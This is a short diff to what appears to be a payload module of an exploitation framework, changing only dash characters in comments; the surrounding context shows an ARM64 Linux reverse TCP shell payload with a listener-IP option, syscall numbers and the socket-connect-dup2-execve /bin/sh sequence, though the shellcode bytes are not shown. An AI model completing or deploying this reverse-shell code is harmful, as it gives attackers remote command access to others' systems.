@@ -21,7 +21,7 @@ class Payload(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
         "references": ["https://shell-storm.org/shellcode/files/shellcode-880.html"],
     }
 
-    architecture = Architectures.ARMLE   # fallback enum — ARM64 extende
+    architecture = Architectures.ARMLE   # fallback enum  -  ARM64 extende
 
     options = {
         "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
@@ -35,7 +35,7 @@ class Payload(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
         ip_bytes = bytes(int(o) for o in lhost.split("."))
         port_bytes = lport.to_bytes(2, "big")
 
-        # ARM64 Linux shellcode — socket(AF_INET,SOCK_STREAM,0) → connect → dup2 × 3 → execve /bin/sh
+        # ARM64 Linux shellcode  -  socket(AF_INET,SOCK_STREAM,0) → connect → dup2 × 3 → execve /bin/sh
         # syscall numbers: socket=198, connect=203, dup2=33, execve=221
         shellcode = (
             # socket(AF_INET=2, SOCK_STREAM=1, 0) → fd in x0
